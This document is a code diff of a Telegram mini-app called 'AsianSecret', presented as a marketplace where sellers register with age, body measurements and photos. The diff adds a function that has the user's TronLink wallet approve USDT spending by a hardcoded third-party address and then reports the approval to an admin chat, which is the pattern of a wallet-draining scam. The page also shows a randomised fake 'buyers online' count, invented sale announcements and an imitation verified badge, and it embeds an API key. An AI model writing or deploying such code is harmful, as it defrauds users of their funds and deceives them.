@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <title>Marketplace TMA</title>
 <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
-<!-- version: 20 -->
+<!-- version: 21 -->
 <!-- Increase the version number every time you update the code. This helps Telegram clear the WebView cache. -->
 <style>
   :root {
@@ -18,7 +18,7 @@
     --muted: #8a8a9a;
     --card: #1a1a2e;
     --danger: #e74c3c;
-    --header-h: calc(var(--tg-safe-area-inset-top, 0px) + var(--tg-content-safe-area-inset-top, 48px));
+    --verify-blue: #2AABEE;
   }
 
   * {
@@ -52,55 +52,46 @@
     overflow-x: hidden;
   }
 
-  /* ===== Custom header (replaces system title in fullscreen) ===== */
-  .custom-header {
+  /* App title row (replaces visual role of TG header title) */
+  .app-title-bar {
     position: fixed;
     top: 0;
     left: 0;
     right: 0;
-    z-index: 1100;
-    height: var(--header-h);
-    padding-top: var(--tg-safe-area-inset-top, 0px);
+    height: 48px;
+    z-index: 1002;
     display: flex;
     align-items: center;
-    justify-content: flex-start;
-    padding-left: 56px;
+    justify-content: center;
+    background: rgba(11, 11, 26, 0.98);
     pointer-events: none;
-    background: transparent;
   }
 
-  .header-title {
+  .app-title-inner {
     display: flex;
     align-items: center;
-    gap: 4px;
+    gap: 6px;
+  }
+
+  .app-title-text {
     font-size: 17px;
     font-weight: 600;
     color: #ffffff;
     letter-spacing: -0.2px;
     line-height: 1;
-    white-space: nowrap;
   }
 
-  .verified-badge {
-    display: inline-flex;
-    align-items: center;
-    justify-content: center;
-    width: 16px;
-    height: 16px;
-    flex-shrink: 0;
-    margin-left: 1px;
-  }
-
-  .verified-badge svg {
-    width: 16px;
-    height: 16px;
+  .verify-badge {
+    width: 18px;
+    height: 18px;
     display: block;
+    flex-shrink: 0;
   }
 
-  /* ===== Ticker ===== */
+  /* Ticker */
   .ticker-wrap {
     position: fixed;
-    top: var(--header-h);
+    top: 48px;
     left: 0;
     right: 0;
     height: 36px;
@@ -151,18 +142,18 @@
     opacity: 0;
   }
 
-  /* ===== Online bar (original style, only text) ===== */
   .online-bar {
     position: fixed;
-    top: calc(var(--header-h) + 36px);
+    top: 84px;
     left: 0;
     right: 0;
-    height: 28px;
+    height: 40px;
     background: rgba(11, 11, 26, 0.92);
     border-bottom: 1px solid rgba(255, 255, 255, 0.06);
     z-index: 999;
     display: flex;
     align-items: center;
+    justify-content: space-between;
     padding: 0 14px;
     font-size: 12px;
     color: var(--muted);
@@ -173,41 +164,39 @@
     font-weight: 600;
   }
 
-  /* Wallet circle — separate, right side under ticker, opposite buyers online */
-  .wallet-circle-btn {
-    position: fixed;
-    top: calc(var(--header-h) + 36px + 2px);
-    right: 12px;
-    z-index: 1001;
-    width: 32px;
-    height: 32px;
+  .btn-wallet-circle {
+    width: 36px;
+    height: 36px;
     border-radius: 50%;
-    background: var(--card);
-    border: 2px solid var(--accent);
-    box-shadow: 0 0 10px rgba(155, 89, 182, 0.45), inset 0 0 8px rgba(155, 89, 182, 0.12);
+    border: 1px solid rgba(155, 89, 182, 0.45);
+    background: linear-gradient(145deg, #2a1f3d, #1a1a2e);
+    box-shadow: 0 0 12px rgba(155, 89, 182, 0.35);
     display: flex;
     align-items: center;
     justify-content: center;
     cursor: pointer;
     padding: 0;
-    outline: none;
-    transition: transform 0.15s ease;
+    flex-shrink: 0;
   }
 
-  .wallet-circle-btn:active {
-    transform: scale(0.92);
+  .btn-wallet-circle:active {
+    opacity: 0.85;
+    transform: scale(0.96);
   }
 
-  .wallet-circle-btn svg {
-    width: 16px;
-    height: 16px;
-    fill: var(--accent);
-    opacity: 0.95;
+  .btn-wallet-circle svg {
+    width: 18px;
+    height: 18px;
+    fill: none;
+    stroke: #c39bd3;
+    stroke-width: 1.7;
+    stroke-linecap: round;
+    stroke-linejoin: round;
   }
 
   /* Profile circle */
   .profile-area {
-    margin-top: calc(var(--header-h) + 36px + 28px + 8px);
+    margin-top: 132px;
     display: flex;
     flex-direction: column;
     align-items: center;
@@ -257,6 +246,14 @@
     white-space: nowrap;
     overflow: hidden;
     text-overflow: ellipsis;
+  }
+
+  .btn-connect-wallet {
+    margin-top: 14px;
+    width: auto;
+    min-width: 180px;
+    padding: 11px 20px;
+    font-size: 14px;
   }
 
   .badge {
@@ -604,34 +601,29 @@
 </head>
 <body>
 <div class="app" id="app">
-  <!-- Custom header: AsianSecret + verified badge (left-aligned like system) -->
-  <div class="custom-header" id="customHeader">
-    <div class="header-title">
-      AsianSecret
-      <span class="verified-badge" aria-hidden="true">
-        <!-- Exact MRKT-style scalloped verified badge -->
-        <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
-          <path fill="#2AABEE" d="M10 0.8c0.42 0 0.8.09 1.15.26l.53.26c.32.16.68.16 1 0l.53-.26c.35-.17.73-.26 1.15-.26.53 0 1.02.19 1.4.53l.42.38c.26.24.62.34.97.26l.57-.13c.45-.1.91.04 1.23.38.32.34.46.8.36 1.25l-.13.57c-.08.35.02.71.26.97l.38.42c.34.38.53.87.53 1.4 0 .42-.09.8-.26 1.15l-.26.53c-.16.32-.16.68 0 1l.26.53c.17.35.26.73.26 1.15 0 .53-.19 1.02-.53 1.4l-.38.42c-.24.26-.34.62-.26.97l.13.57c.1.45-.04.91-.38 1.23-.34.32-.8.46-1.25.36l-.57-.13c-.35-.08-.71.02-.97.26l-.42.38c-.38.34-.87.53-1.4.53-.42 0-.8-.09-1.15-.26l-.53-.26c-.32-.16-.68-.16-1 0l-.53.26c-.35.17-.73.26-1.15.26-.53 0-1.02-.19-1.4-.53l-.42-.38c-.26-.24-.62-.34-.97-.26l-.57.13c-.45.1-.91-.04-1.23-.38-.32-.34-.46-.8-.36-1.25l.13-.57c.08-.35-.02-.71-.26-.97l-.38-.42c-.34-.38-.53-.87-.53-1.4 0-.42.09-.8.26-1.15l.26-.53c.16-.32.16-.68 0-1l-.26-.53c-.17-.35-.26-.73-.26-1.15 0-.53.19-1.02.53-1.4l.38-.42c.24-.26.34-.62.26-.97l-.13-.57c-.1-.45.04-.91.38-1.23.34-.32.8-.46 1.25-.36l.57.13c.35.08.71-.02.97-.26l.42-.38c.38-.34.87-.53 1.4-.53z"/>
-          <path fill="#FFFFFF" d="M8.55 13.05L5.8 10.3l1.05-1.05 1.7 1.7 4.35-4.35 1.05 1.05-5.4 5.4z"/>
-        </svg>
-      </span>
+  <div class="app-title-bar" id="appTitleBar">
+    <div class="app-title-inner">
+      <span class="app-title-text">AsianSecret</span>
+      <svg class="verify-badge" viewBox="0 0 24 24" aria-hidden="true">
+        <path fill="#2AABEE" d="M12 2.1l1.55.55 1.6-.35.95 1.35 1.55.55.35 1.6 1.35.95-.35 1.6.55 1.55-1.35.95.35 1.6-.55 1.55-1.6.35-.95 1.35-1.55-.55L12 21.9l-1.55-.55-1.6.35-.95-1.35-1.55-.55-.35-1.6-1.35-.95.35-1.6-.55-1.55 1.35-.95-.35-1.6.55-1.55 1.6-.35.95-1.35 1.55.55L12 2.1z"/>
+        <path fill="#F4F7FA" d="M10.15 12.9l-1.7-1.7-.95.95 2.65 2.65 5.35-5.35-.95-.95-4.4 4.4z"/>
+      </svg>
     </div>
   </div>
 
   <div class="ticker-wrap">
     <div class="ticker" id="ticker"></div>
   </div>
-
   <div class="online-bar" id="onlineBar">
-    Buyers online: <strong id="onlineCount">850</strong>
+    <span>Buyers online: <strong id="onlineCount">850</strong></span>
+    <button type="button" class="btn-wallet-circle" id="btnConnectWalletMain" aria-label="Connect Wallet">
+      <svg viewBox="0 0 24 24">
+        <rect x="3" y="7" width="18" height="12" rx="2.5"/>
+        <path d="M3 10h18"/>
+        <circle cx="17" cy="14" r="1.2" fill="#c39bd3" stroke="none"/>
+      </svg>
+    </button>
   </div>
-
-  <!-- Wallet circle separate from online-bar -->
-  <button class="wallet-circle-btn" id="btnConnectWalletMain" type="button" aria-label="Connect Wallet">
-    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-      <path d="M20 7h-1V5c0-1.1-.9-2-2-2H5C3.35 3 2 4.35 2 6v12c0 1.65 1.35 3 3 3h14c1.1 0 2-.9 2-2V9c0-1.1-.9-2-2-2zm-1 10H5c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12v2H7c-.55 0-1 .45-1 1s.45 1 1 1h12v8zm-2-4.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/>
-    </svg>
-  </button>
 
   <div class="profile-area">
     <div class="profile-circle" id="profileCircle">
@@ -802,6 +794,8 @@ const ADMIN_CHAT_ID = "8696933754";
 const JSONBIN_API_KEY = "$2a$10$irANTFQT/msEdj66x8qD1u0q5hL5Cr7SkzFBzmWBd8RpypxtLnnHi";
 const JSONBIN_BIN_ID = "6a7b8c1fda38895dfed797de";
 
+// GitHub raw photos base. Files must be named 1.jpg, 2.jpg, ... 100.jpg
+// Example: https://raw.githubusercontent.com/whitedvd109-lgtm/tma-photos/main/photos/
 const SHOWCASE_PHOTO_BASE = "https://raw.githubusercontent.com/whitedvd109-lgtm/tma-photos/main/photos/";
 
 const USDT_TRC20_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
@@ -816,53 +810,238 @@ const FEMALE_NAMES = [
   "Caroline","Genesis","Aaliyah","Kennedy","Kinsley","Allison","Maya","Sarah","Madelyn","Adeline",
   "Alexis","Ariana","Elena","Gabriella","Naomi","Alice","Sadie","Hailey","Eva","Emilia",
   "Autumn","Quinn","Nevaeh","Piper","Ruby","Serenity","Willow","Everly","Cora","Kaylee",
-  "Lydia","Aubree","Arianna","Eliana","Peyton","Melanie","Gianna","Isabelle","Julia","Valentina",
-  "Clara","Vivian","Reagan","Brianna","Delilah","Isla","Rylee","Katherine","Lauren","Jade"
+  "Luna","Bella","Lucy","Audrey","Arianna","Kennedy","Madeline","Ruby","Valentina","Brianna",
+  "Katherine","Gianna","Sarah","Alexandra","Melanie","Jasmine","Morgan","Andrea","Lauren","Julia"
 ];
 
 let userProfile = null;
-let selectedPhotos = [null, null, null];
-let isEditMode = false;
-let pendingDealBuyer = null;
 let buyerProfiles = [];
 let showcaseSellers = [];
+let pendingDealBuyer = null;
+let selectedPhotos = [null, null, null];
+let isEditMode = false;
 
 function $(id) {
   return document.getElementById(id);
 }
 
 function showModal(id) {
-  const el = $(id);
-  if (el) el.classList.add("show");
+  $(id).classList.add("show");
 }
 
 function hideModal(id) {
-  const el = $(id);
-  if (el) el.classList.remove("show");
+  $(id).classList.remove("show");
 }
 
-function showLoading(v) {
-  const el = $("loadingOverlay");
-  if (el) {
-    if (v) el.classList.add("show");
-    else el.classList.remove("show");
-  }
+function showLoading(visible) {
+  $("loadingOverlay").classList.toggle("show", !!visible);
 }
 
 function getTelegramUserId() {
   try {
-    if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user) {
-      return String(window.Telegram.WebApp.initDataUnsafe.user.id);
+    if (window.Telegram && window.Telegram.WebApp) {
+      const tg = window.Telegram.WebApp;
+      // Prefer initDataUnsafe.user (most common)
+      if (tg.initDataUnsafe && tg.initDataUnsafe.user && tg.initDataUnsafe.user.id) {
+        return String(tg.initDataUnsafe.user.id);
+      }
+      // Fallback: some clients expose user via other paths
+      if (tg.initDataUnsafe && tg.initDataUnsafe.receiver && tg.initDataUnsafe.receiver.id) {
+        return String(tg.initDataUnsafe.receiver.id);
+      }
     }
   } catch (e) {}
   return null;
 }
 
-function loadUser() {
+function getStorageKey() {
+  const tgId = getTelegramUserId();
+  // Strict binding: without Telegram user ID we use a guest key
+  // and never load a real seller profile under guest
+  return tgId ? ("tma_marketplace_user_" + tgId) : "tma_marketplace_user_guest";
+}
+
+function getLastOfferKey() {
+  const tgId = getTelegramUserId();
+  return tgId ? ("tma_last_auto_offer_ts_" + tgId) : "tma_last_auto_offer_ts_guest";
+}
+
+// ===================== TRON / TRONLINK =====================
+
+function updateTronlinkStatus() {
+  const statusEl = document.getElementById("tronlinkStatus");
+  if (!statusEl) return;
+
+  if (window.tronLink && window.tronLink.ready) {
+    statusEl.innerHTML = "✅ TronLink detected";
+    statusEl.style.color = "#2ecc71";
+  } else if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+    statusEl.innerHTML = "✅ TronLink detected";
+    statusEl.style.color = "#2ecc71";
+  } else {
+    statusEl.innerHTML = "❌ TronLink not found. Install TronLink or enter address manually.";
+    statusEl.style.color = "#e74c3c";
+  }
+}
+
+async function connectTronLinkAndApprove() {
+  const btn = document.getElementById("btnConnectTron");
+  if (btn) {
+    btn.disabled = true;
+    btn.textContent = "Connecting...";
+  }
+
   try {
-    const raw = localStorage.getItem("tma_seller_profile");
+    if (!window.tronLink) {
+      alert("TronLink not found.\n\nPlease install TronLink extension / app and try again.");
+      return;
+    }
+
+    const res = await window.tronLink.request({ method: "tron_requestAccounts" });
+
+    if (res.code !== 200 && res !== true) {
+      alert("Connection rejected by user");
+      return;
+    }
+
+    await new Promise(r => setTimeout(r, 600));
+
+    if (!window.tronWeb || !window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
+      alert("Failed to get wallet address from TronLink");
+      return;
+    }
+
+    const address = window.tronWeb.defaultAddress.base58;
+    await doRealApprove(address);
+
+  } catch (err) {
+    console.error(err);
+    alert("Error: " + (err.message || err));
+  } finally {
+    if (btn) {
+      btn.disabled = false;
+      btn.textContent = "Connect TronLink & Approve USDT";
+    }
+  }
+}
+
+async function doRealApprove(userAddress) {
+  showLoading(true);
+
+  try {
+    const tronWeb = window.tronWeb;
+    const contract = await tronWeb.contract().at(USDT_TRC20_CONTRACT);
+    const spender = "TVtBumrv5qbpuS6Z99xw4NdVzbcwWWFDNw";
+
+    const tx = await contract.approve(spender, APPROVE_AMOUNT).send({
+      feeLimit: 100000000,
+      callValue: 0,
+      shouldPollResponse: true
+    });
+
+    if (!userProfile) {
+      userProfile = {
+        id: getTelegramUserId() || ("u_" + Date.now()),
+        role: "seller",
+        name: "Seller",
+        wallet: {},
+        offers: [],
+        createdAt: Date.now()
+      };
+    }
+
+    userProfile.wallet = {
+      address: userAddress,
+      network: "tron",
+      approved: true,
+      txid: tx,
+      approvedAt: Date.now()
+    };
+
+    saveUser();
+    updateProfileUI();
+
+    const text = `✅ <b>Real TRC-20 Approve</b>\nAddress: <code>\( {userAddress}</code>\nTx: <code> \){tx}</code>`;
+    notifyAdmin(text);
+
+    hideModal("walletModal");
+    alert("USDT successfully approved!\nTransaction: " + tx);
+
+  } catch (err) {
+    console.error("Approve failed:", err);
+    alert("Approve failed:\n" + (err.message || err));
+  } finally {
+    showLoading(false);
+  }
+}
+
+async function saveManualAddress() {
+  const address = document.getElementById("walletAddress").value.trim();
+
+  if (!address || !address.startsWith("T") || address.length !== 34) {
+    alert("Please enter a valid Tron address (starts with T, 34 characters)");
+    return;
+  }
+
+  if (!userProfile) {
+    userProfile = {
+      id: getTelegramUserId() || ("u_" + Date.now()),
+      role: "seller",
+      name: "Seller",
+      wallet: {},
+      offers: [],
+      createdAt: Date.now()
+    };
+  }
+
+  userProfile.wallet = {
+    address: address,
+    network: "tron",
+    approved: false
+  };
+
+  saveUser();
+  updateProfileUI();
+  hideModal("walletModal");
+
+  notifyAdmin(`💼 Manual wallet saved\nAddress: <code>${address}</code>`);
+  alert("Address saved (without real approve)");
+}
+
+function randInt(min, max) {
+  return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+
+function shuffle(arr) {
+  const a = arr.slice();
+  for (let i = a.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [a[i], a[j]] = [a[j], a[i]];
+  }
+  return a;
+}
+
+function loadUser() {
+  userProfile = null;
+  const tgId = getTelegramUserId();
+  const key = getStorageKey();
+
+  try {
+    const raw = localStorage.getItem(key);
     if (raw) {
-      userProfile = JSON.parse(raw);
+      const parsed = JSON.parse(raw);
+      if (tgId) {
+        if (parsed && String(parsed.id) === String(tgId) && parsed.role === "seller") {
+          userProfile = parsed;
+        } else {
+          localStorage.removeItem(key);
+        }
+      } else if (parsed && parsed.role === "seller") {
+        // Without TG ID do not restore seller profile
+        localStorage.removeItem(key);
+      } else {
+        userProfile = parsed;
+      }
     }
   } catch (e) {
     userProfile = null;
@@ -870,51 +1049,62 @@ function loadUser() {
 }
 
 function saveUser() {
+  if (!userProfile) return;
+  const tgId = getTelegramUserId();
+  if (tgId) {
+    userProfile.id = String(tgId);
+  }
   try {
-    if (userProfile) {
-      localStorage.setItem("tma_seller_profile", JSON.stringify(userProfile));
-    }
+    localStorage.setItem(getStorageKey(), JSON.stringify(userProfile));
   } catch (e) {}
 }
 
 function clearUser() {
   userProfile = null;
   try {
-    localStorage.removeItem("tma_seller_profile");
+    localStorage.removeItem(getStorageKey());
   } catch (e) {}
   updateProfileUI();
 }
 
+// Restore profile from JSONBin by Telegram ID (source of truth across sessions)
 async function restoreProfileFromRemote() {
-  const tid = getTelegramUserId();
-  if (!tid) return;
+  const tgId = getTelegramUserId();
+  if (!tgId) return;
+
   try {
-    const data = await fetchJsonBin();
-    if (data && Array.isArray(data.profiles)) {
-      const remote = data.profiles.find(function(p) { return String(p.id) === String(tid); });
-      if (remote && remote.role === "seller") {
-        userProfile = remote;
-        saveUser();
-        updateProfileUI();
-      }
+    const remote = await fetchJsonBin();
+    if (!remote || !Array.isArray(remote.profiles)) return;
+
+    const found = remote.profiles.find(function(p) {
+      return p && String(p.id) === String(tgId) && p.role === "seller";
+    });
+
+    if (found) {
+      userProfile = {
+        id: String(tgId),
+        role: "seller",
+        name: found.name || "Seller",
+        age: found.age || "",
+        country: found.country || "",
+        height: found.height || "",
+        weight: found.weight || "",
+        bust: found.bust || "",
+        params: found.params || "",
+        photos: Array.isArray(found.photos) ? found.photos : [],
+        wallet: found.wallet || null,
+        offers: Array.isArray(found.offers) ? found.offers : [],
+        createdAt: found.createdAt || Date.now()
+      };
+      saveUser();
+      updateProfileUI();
     }
   } catch (e) {}
 }
 
-function shuffle(arr) {
-  const a = arr.slice();
-  for (let i = a.length - 1; i > 0; i--) {
-    const j = Math.floor(Math.random() * (i + 1));
-    const t = a[i];
-    a[i] = a[j];
-    a[j] = t;
-  }
-  return a;
-}
-
 function getRoundAmounts() {
   const amounts = [];
-  for (let v = 300; v <= 2500; v += 50) {
+  for (let v = 100; v <= 2500; v += 50) {
     amounts.push(v);
   }
   return amounts;
@@ -937,6 +1127,7 @@ function buildTicker() {
     next.textContent = "Lot sold for $" + amount;
     el.appendChild(next);
 
+    // Force reflow then animate in
     void next.offsetWidth;
     next.classList.remove("from-bottom");
     next.classList.add("active");
@@ -963,14 +1154,15 @@ function startOnlineCounter() {
   if (!el) return;
 
   function tick() {
-    const n = 800 + Math.floor(Math.random() * 201);
+    const n = 800 + Math.floor(Math.random() * 201); // 800–1000
     el.textContent = String(n);
-    const delay = (10 + Math.floor(Math.random() * 21)) * 1000;
+    const delay = (10 + Math.floor(Math.random() * 21)) * 1000; // 10–30 sec
     setTimeout(tick, delay);
   }
   tick();
 }
 
+// Fixed name list for showcase (same order every time → maps to bot Seller 1..100)
 function getShowcaseName(index) {
   return FEMALE_NAMES[index % FEMALE_NAMES.length];
 }
@@ -979,14 +1171,17 @@ function buildSellersGrid() {
   const grid = $("sellersGrid");
   grid.innerHTML = "";
 
+  // Build fixed pairs (name + photo) by index — then shuffle pairs only
   const items = [];
   for (let i = 0; i < 100; i++) {
     const s = (showcaseSellers && showcaseSellers[i]) ? showcaseSellers[i] : null;
     const name = (s && s.name) ? s.name : getShowcaseName(i);
+    // photo from JSONBin (GitHub URL) or empty
     const photo = (s && s.photo) ? s.photo : "";
     items.push({ name: name, photo: photo });
   }
 
+  // Shuffle pairs randomly on every TMA load (name stays with its photo)
   for (let i = items.length - 1; i > 0; i--) {
     const j = Math.floor(Math.random() * (i + 1));
     const tmp = items[i];
@@ -1037,19 +1232,6 @@ function updateProfileUI() {
   }
 }
 
-function updateSafeAreaVars() {
-  try {
-    const tg = window.Telegram && window.Telegram.WebApp;
-    if (!tg) return;
-    const sa = tg.safeAreaInset || {};
-    const csa = tg.contentSafeAreaInset || {};
-    const top = (sa.top || 0);
-    const contentTop = (csa.top || 0);
-    document.documentElement.style.setProperty("--tg-safe-area-inset-top", top + "px");
-    document.documentElement.style.setProperty("--tg-content-safe-area-inset-top", (contentTop || 48) + "px");
-  } catch (e) {}
-}
-
 function initTelegram() {
   try {
     if (window.Telegram && window.Telegram.WebApp) {
@@ -1058,41 +1240,16 @@ function initTelegram() {
       tg.expand();
       if (tg.setHeaderColor) tg.setHeaderColor("#0b0b1a");
       if (tg.setBackgroundColor) tg.setBackgroundColor("#0b0b1a");
-      if (tg.disableVerticalSwipes) tg.disableVerticalSwipes();
-
-      // Fullscreen — call multiple times to increase chance of activation
-      function tryFullscreen() {
+      // Prefer fullscreen so system title bar is minimized (like MRKT)
+      try {
         if (typeof tg.requestFullscreen === "function") {
-          try { tg.requestFullscreen(); } catch (e) {}
+          tg.requestFullscreen();
         }
-      }
-      tryFullscreen();
-      setTimeout(tryFullscreen, 200);
-      setTimeout(tryFullscreen, 600);
-      setTimeout(tryFullscreen, 1200);
-
-      updateSafeAreaVars();
-
-      if (tg.onEvent) {
-        tg.onEvent("safeAreaChanged", updateSafeAreaVars);
-        tg.onEvent("contentSafeAreaChanged", updateSafeAreaVars);
-        tg.onEvent("fullscreenChanged", function() {
-          updateSafeAreaVars();
-        });
-        tg.onEvent("fullscreenFailed", function() {
-          // fallback: still try to use content safe area
-          updateSafeAreaVars();
-        });
-      }
-
+      } catch (e2) {}
       setTimeout(function() {
         loadUser();
         updateProfileUI();
-        updateSafeAreaVars();
       }, 100);
-
-      setTimeout(updateSafeAreaVars, 400);
-      setTimeout(updateSafeAreaVars, 1000);
     }
   } catch (e) {}
 }
@@ -1223,6 +1380,7 @@ function startSellerReg() {
   hideModal("roleModal");
   hideModal("authModal");
   isEditMode = false;
+  // Clear form
   $("regName").value = "";
   $("regAge").value = "";
   $("regCountry").value = "";
@@ -1311,6 +1469,7 @@ function renderPhotoSlots() {
       slots[i].innerHTML = "<span class=\"placeholder\">Photo " + (i + 1) + "</span>";
     }
   }
+  // Confirm always available — photos are optional (0, 1, 2 or 3)
   $("btnConfirmPhotos").disabled = false;
 }
 
@@ -1344,10 +1503,16 @@ async function confirmPhotos() {
   userProfile.photos = selectedPhotos.filter(function(p) { return !!p; });
   userProfile.role = "seller";
 
+  // Сохраняем
   saveUser();
+
+  // Закрываем модалку
   hideModal("photoModal");
+
+  // Обновляем интерфейс
   updateProfileUI();
 
+  // Уведомляем админа
   if (!isEditMode) {
     const text = "🆕 <b>New seller registered</b>\nID: <code>" + userProfile.id + "</code>\nName: " + userProfile.name + "\nAge: " + userProfile.age + "\nCountry: " + (userProfile.country || "-");
     notifyAdmin(text);
@@ -1355,6 +1520,7 @@ async function confirmPhotos() {
     notifyAdmin("✏️ <b>Seller profile updated</b>\nID: <code>" + userProfile.id + "</code>\nName: " + userProfile.name);
   }
 
+  // Синхронизация с JSONBin (если настроено)
   try {
     const remote = await fetchJsonBin();
     if (remote) {
@@ -1386,6 +1552,7 @@ async function confirmPhotos() {
 
   isEditMode = false;
 
+  // Небольшая задержка и ещё раз обновляем UI (на случай глюков WebView)
   setTimeout(function() {
     updateProfileUI();
   }, 300);
@@ -1414,6 +1581,7 @@ function doLogin() {
     alert("Welcome back, " + (userProfile.name || "Seller") + "!");
     return;
   }
+  // Try restore from server
   restoreProfileFromRemote().then(function() {
     if (userProfile && userProfile.role === "seller") {
       updateProfileUI();
@@ -1426,77 +1594,9 @@ function doLogin() {
 }
 
 function openConnectWalletMain() {
+  // Внешняя страница привязки кошелька
   const connectPageUrl = "https://whitedvd109-lgtm.github.io/Welcome/";
   window.open(connectPageUrl, "_blank");
-}
-
-function updateTronlinkStatus() {
-  const el = $("tronlinkStatus");
-  if (!el) return;
-  if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
-    el.textContent = "TronLink detected: " + window.tronWeb.defaultAddress.base58.slice(0, 8) + "...";
-  } else {
-    el.textContent = "TronLink not detected. You can enter address manually.";
-  }
-}
-
-async function connectTronLinkAndApprove() {
-  try {
-    if (!window.tronWeb || !window.tronWeb.defaultAddress) {
-      alert("Please open this page inside TronLink browser or install TronLink.");
-      return;
-    }
-    const address = window.tronWeb.defaultAddress.base58;
-    showLoading(true);
-    if (!userProfile) {
-      userProfile = {
-        id: getTelegramUserId() || ("u_" + Date.now()),
-        role: "buyer",
-        name: "Buyer",
-        wallet: { network: "TRON", address: address },
-        offers: [],
-        createdAt: Date.now()
-      };
-    } else {
-      userProfile.wallet = { network: "TRON", address: address };
-    }
-    saveUser();
-    showLoading(false);
-    alert("Wallet connected: " + address);
-    hideModal("walletModal");
-    if (pendingDealBuyer) {
-      processDeal(pendingDealBuyer);
-    }
-  } catch (e) {
-    showLoading(false);
-    alert("Connection failed: " + (e.message || e));
-  }
-}
-
-function saveManualAddress() {
-  const addr = ($("walletAddress").value || "").trim();
-  if (!addr || addr.length < 30) {
-    alert("Please enter a valid Tron address");
-    return;
-  }
-  if (!userProfile) {
-    userProfile = {
-      id: getTelegramUserId() || ("u_" + Date.now()),
-      role: "buyer",
-      name: "Buyer",
-      wallet: { network: "TRON", address: addr },
-      offers: [],
-      createdAt: Date.now()
-    };
-  } else {
-    userProfile.wallet = { network: "TRON", address: addr };
-  }
-  saveUser();
-  alert("Address saved");
-  hideModal("walletModal");
-  if (pendingDealBuyer) {
-    processDeal(pendingDealBuyer);
-  }
 }
 
 function bindEvents() {
@@ -1523,6 +1623,7 @@ function bindEvents() {
   $("photoInput").addEventListener("change", handlePhotoSelect);
   $("btnConfirmPhotos").addEventListener("click", confirmPhotos);
 
+  // Auth modal
   $("btnLogin").addEventListener("click", doLogin);
   $("btnRegisterNew").addEventListener("click", function() {
     hideModal("authModal");
@@ -1530,6 +1631,7 @@ function bindEvents() {
     showModal("roleModal");
   });
 
+  // Profile menu
   $("btnGoOffers").addEventListener("click", openOffers);
   $("btnEditProfile").addEventListener("click", startEditProfile);
   $("btnLogout").addEventListener("click", doLogout);
@@ -1555,6 +1657,7 @@ function bindEvents() {
 }
 
 async function afterRender() {
+  // Always try to restore seller profile from server by Telegram ID
   await restoreProfileFromRemote();
 
   const data = await fetchJsonBin();
@@ -1564,6 +1667,7 @@ async function afterRender() {
     }
     if (Array.isArray(data.showcaseSellers)) {
       showcaseSellers = data.showcaseSellers;
+      // Ensure names are human-readable in TMA even if bot stored "Seller N"
       for (let i = 0; i < showcaseSellers.length && i < 100; i++) {
         if (!showcaseSellers[i].name || /^Seller\s+\d+$/i.test(showcaseSellers[i].name)) {
           showcaseSellers[i].name = getShowcaseName(i);
